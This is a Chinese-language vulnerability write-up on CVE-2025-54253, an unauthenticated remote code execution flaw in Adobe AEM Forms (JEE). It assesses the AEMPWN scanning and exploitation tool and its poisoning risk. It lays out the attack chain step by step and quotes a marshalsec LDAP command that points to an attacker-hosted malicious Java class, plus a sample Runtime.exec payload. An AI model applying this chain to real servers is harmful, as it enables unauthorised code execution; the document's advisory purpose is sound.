## CVE-2025-54253 - Adobe Experience Manager (AEM) Forms (JEE) 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-54253

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Adobe Experience Manager (AEM) Forms (JEE)

**危害等级:** 严重

**CVSS评分:** 10.0

**影响版本:** Adobe AEM Forms (JEE) 6.5.23.0及更早版本

**利用条件:** 无需认证, 远程可利用, 无需用户交互

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该POC代码库名为AEMPWN，是一个专门为Adobe Experience Manager (AEM) Forms设计的扫描和利用工具，支持对CVE-2025-54253和CVE-2025-54254漏洞进行检测与验证。根据其`README.md`文件描述，AEMPWN提供三种操作模式，旨在满足真实世界的渗透测试和红队工作流程需求。特别是针对CVE-2025-54253的RCE模式，该工具明确指出能够演示AEM服务器上的实际代码执行，实现P1级别的影响。它通过JNDI注入结合XML解析技术实现这一目标。该模式依赖于外部的LDAP服务器（例如marshalsec）和HTTP服务器来提供编译后的恶意Java类，这与业界已知的JNDI注入利用链机制完全吻合。POC代码清晰地提供了这些外部工具的配置指南和Java恶意类的示例，这极大地增强了其可用性和可靠性。因此，该POC具有高度的有效性，能够从检测到完整利用的整个过程进行验证。

**利用步骤**:
1. **初期侦察与目标识别**: 攻击者首先使用AEMPWN工具的扫描功能，识别互联网上暴露的、运行Adobe Experience Manager (AEM) Forms (JEE) 6.5.23.0及更早版本的实例。该漏洞通常存在于AEM Forms的管理界面中，允许未经身份验证的访问。
2. **构建攻击基础设施**: 
    * **部署LDAP服务器**: 攻击者需要启动一个支持JNDI注入的LDAP服务器。通常使用`marshalsec`工具，命令格式为 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<攻击者控制的HTTP服务器地址>:<端口>/#Exploit" <LDAP监听端口>`。这个LDAP服务器将作为JNDI查询的响应点，指示目标AEM服务器去哪里下载恶意Java类。
    * **部署HTTP服务器**: 同时，攻击者需要一个HTTP服务器来托管编译好的恶意Java类（例如`Exploit.class`）。这个HTTP服务器的地址和端口必须与LDAP服务器响应中指定的URL一致。
    * **编译恶意Java类**: 攻击者编写一个Java类（如`Exploit.java`），其静态代码块包含希望在目标AEM服务器上执行的命令（例如`Runtime.getRuntime().exec("touch /tmp/pwned");`或反弹shell命令）。编译后生成`Exploit.class`文件，并将其放置在HTTP服务器的根目录或指定路径下。
3. **执行RCE利用**: 攻击者使用AEMPWN工具的`--rce`模式，指定目标AEM Forms实例的URL以及已部署的LDAP服务器地址。AEMPWN会构造一个特定的HTTP请求，发送到AEM Forms的管理界面。这个请求利用了该漏洞的本质：AEM Forms中Apache Struts的`devMode`被错误启用，且存在认证绕过，允许未认证攻击者注入并执行OGNL表达式。
4. **JNDI查找与代码执行**: 目标AEM服务器在处理这个恶意构造的请求时，会解析OGNL表达式中包含的JNDI引用。这会导致AEM服务器尝试连接到攻击者控制的LDAP服务器进行查找。LDAP服务器会响应一个JNDI Reference，其中包含了恶意Java类的HTTP下载路径。AEM服务器的JVM随后会从攻击者控制的HTTP服务器下载`Exploit.class`文件，并在服务器的上下文中加载并执行该类。最终，恶意代码在AEM服务器上成功执行，实现远程代码执行。

**投毒风险分析**:
AEMPWN工具的投毒风险评估为低，大约在10%。这个评估是基于对提供的`README.md`文件和工具设计理念的深入分析。首先，该工具的明确声明“This tool is designed for authorized security testing only”，表明其开发目的是合法的防御性安全研究。其次，在POC代码的描述中，并未发现任何典型的恶意软件行为，例如代码混淆、植入后门、未经授权的敏感数据收集、或是通过隐蔽通道与外部恶意服务器进行通信。工具的核心功能是构建HTTP请求，发送Payload，并处理目标系统的响应，这些都是标准的漏洞扫描和利用流程。

值得注意的是，POC中包含了一个名为`Exploit.class`的Java恶意类示例，其目的是演示在目标系统上实现实际的RCE。这种“恶意类”本质上是漏洞利用的载荷（payload），其内容可以根据攻击者的意图进行定制，例如创建文件、执行系统命令或建立反向shell连接。这种Payload是漏洞利用成功的必要组成部分，它代表的是攻击行为本身，而不是POC工具包含的“投毒”代码。如果将其误判为工具本身的恶意代码，则会混淆漏洞利用的本质与工具本身的安全性。

尽管该工具本身的投毒风险较低，但任何安全研究人员在使用此类工具时，都应遵循严格的安全操作规范。例如，始终在隔离的测试环境中运行POC代码，对所有出站和入站网络流量进行监控和审查，并确保所使用的LDAP服务器和HTTP服务器（用于托管恶意Java类）是完全由研究人员控制和信任的。此外，对POC代码进行独立的安全审计，验证其行为与预期功能一致，是进一步降低风险的最佳实践。综上所述，AEMPWN是一个透明且专注于漏洞利用的工具，只要在使用过程中采取必要的预防措施，其自身携带恶意代码或被滥用的风险是微乎其微的。

**项目地址:** https://github.com/secure-aem/aempwn

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54253
